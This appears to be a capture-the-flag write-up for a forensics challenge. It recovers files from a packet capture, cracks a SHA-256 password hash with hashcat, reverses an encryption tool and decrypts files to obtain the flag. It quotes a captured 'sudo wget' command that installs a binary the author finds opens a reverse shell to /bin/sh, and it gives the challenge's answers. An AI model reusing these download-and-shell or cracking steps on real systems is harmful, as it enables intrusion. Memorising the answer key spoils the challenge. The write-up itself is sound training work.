# The Victims of Lytton Labs

## Flavor Text

Using the _LYTTON LABS Packet Capture file (pcap-challenge-final.pcapng)_ from _LYTTON LABS 01_, find the tool and the password to decrypt the encrypted files.

## How to solve it?

We are given a pcap file called **"pcap-challenge-final.pcapng"** and we need to find: 

- some encrypted file
- the tool to decrypt them
- the password to decrypt them

We can run strings on the file to find some useful information:

```strings pcap-challenge-final.pcapng | sort | uniq | grep "dec"```

> 08-22-21  05:45PM                  194 secret_decoder.bin
--2021-08-22 17:55:35--  http://192.168.100.105/secret_decoder.bin
GET /secret_decoder.bin HTTP/1.1
PASS december
RETR /TOOLS/secret_decoder.bin
-rwxr-xr-x  1 luciafer luciafer      194 Aug 22 17:43 secret_decoder.bin
sudo wget -O /usr/bin/ll-connect.bin http://192.168.100.105/secret_decoder.bin

Ok there is a file called **"secret_decoder.bin"**

```strings pcap-challenge-final.pcapng | sort | uniq | grep "pass"```

> 
08-07-21  09:25PM                   64 encryption-password-cgeschickter.txt
env_reset, mail_badpass,
PASS password
PASS password1
passport
passport.baidu.com
RETR /SECRET/encryption-password-cgeschickter.txt

There is another file called **"encryption-password-cgeschickter.txt"**

```strings pcap-challenge-final.pcapng | sort | uniq | grep ".exe"```

> 08-07-21  09:07PM               105984 lytton-crypt.exe
RETR /TOOLS/lytton-crypt.exe
-rw-r--r--  1 root     root       105984 Aug 21 23:16 lytton-crypt-recovered.exe

And there we have the encryption file **"lyton-crypt.exe"**

We can see that most of the files were access using RETR, that's an FTP command, so we can retrieve the data from the files using Wireshark and filtering for FTP-DATA.

Let's first look for the password

### Password

![[Pasted image 20211016004636.png]]

If we open that package we can see a long string that looks hashed:

>    75AC98147C07752767E09EF781CF998E401D19B01E30CBAA5109D6AD7EC9A174

We can run ```hash-identifier```  on it

![[Pasted image 20211016004820.png]]

We can use ```hashcat``` to try and break it, I will first try SHA-256 (module 1400 in hashcat) with the rockyou.txt wordlist

```hashcat.exe -m 1400 hashes.txt rockyou.txt -O```

We cracked it, the password is **"demagorgon"**

### Retrieving the Files

We can retrieve the **"secret_decoder.bin"** and **"lyton-crypt.exe"** files by right-clicking in their packages and Follow TCP Stream, then we can copy the raw data of the package and save it on our computer.

#### secret_decoder.bin

We can find out the type of file by running ```file``` on it 

```file secret_decoder.bin```

> ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header

So is an executable, we can open it on Ghidra or Binary Ninja to see what does it do.

I first try opening it with Ghidra but it was not working properly so I opened  it with Binary Ninja

![[Pasted image 20211016010007.png]]

If we analyze the code we can see that it opens a socket in the IP address ```242.29.0.0``` and then runs /bin/sh on it.

Weird, that's not decoding anything, it is probably some obfuscation to confuse us.

### lyton-crypt.exe

This one is supposed to be the file used to encrypt the other files, we can analyze it on Ghidra first.

If we see the functions we can find some interesting ones:


- usage

```
void usage(undefined8 param_1)

{
  __fprintf_chk(stderr,1,"Usage is: %s -[orc][-sN] file1 file2..\n",param_1);
  fwrite("  -o Write output to standard out\n",1,0x22,stderr);
  fwrite("  -r Do NOT remove input files after processing\n",1,0x30,stderr);
  fwrite("  -c Do NOT compress files before encryption\n",1,0x2d,stderr);
  fwrite("  -sN How many times to overwrite input files with random data\n",1,0x3f,stderr);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

So this one is actually used to encrypt the files. 

![[Pasted image 20211016010458.png]]

Hmmm we have a Decrypt function but it does not say anything about it on the usage, it is probably some hidden functionality

We can try to encrypt a file with any password, and then try to "encrypt" it again to see if it works 

```./lyton-crypt.exe anyfile``` 

> Encryption key:
Again:

Ok the file is pretty much decrypted and it now has the .lcr extension, now let's do it again with the same key

```./lyton-crypt.exe anyfile.lcr``` 

> Encryption key:

Hmm, this time it did not ask for the password again and it actually decrypted the file.

### Finding and Decrypting the files

Now we know that the encrypted files have the .lcr extension we can look for them

```strings pcap-challenge-final.pcapng | sort | uniq | grep ".lcr"```

> RETR /MKDELTA/david-k.txt.lcr
RETR /MKDELTA/david-z.txt.lcr
RETR /MKDELTA/ephraim-w.txt.lcr
RETR /MKSEARCH/daniel-s.txt.lcr
RETR /MKSEARCH/donald-m.txt.lcr
RETR /MKULTRA/deirdre-p.txt.lcr
RETR /MKULTRA/terry-i.txt.lcr
RETR /MKULTRA/wendy-p.txt.lcr
RETR /PROJECTMONARCH/ariana-s.txt.lcr
RETR /PROJECTMONARCH/brittney-s.txt.lcr
RETR /PROJECTMONARCH/christina-a-s.txt.lcr

We can retrieve the files the same way we did for the executables, and try to decrypt them with the password "demagorgon".

When decrypting "christina-a-s.txt.lcr", "britney-s.txt.lcr" and "ariana-s.txt.lcr" I get pretty much the same information that when they were encrypted.

But then I tried for "donald-m.txt.lcr" and I got actually readable text

![[Pasted image 20211016011402.png]]

So now we know that the files on the /MKSEARCH/ directory can be decrypted into text, let's try the other one "daniel-s.txt.lcr"

![[Pasted image 20211016011506.png]]

We got the flag!

## Flag 

> flag{D0nt-ME$$-with-The-ZEAL0t!!!}
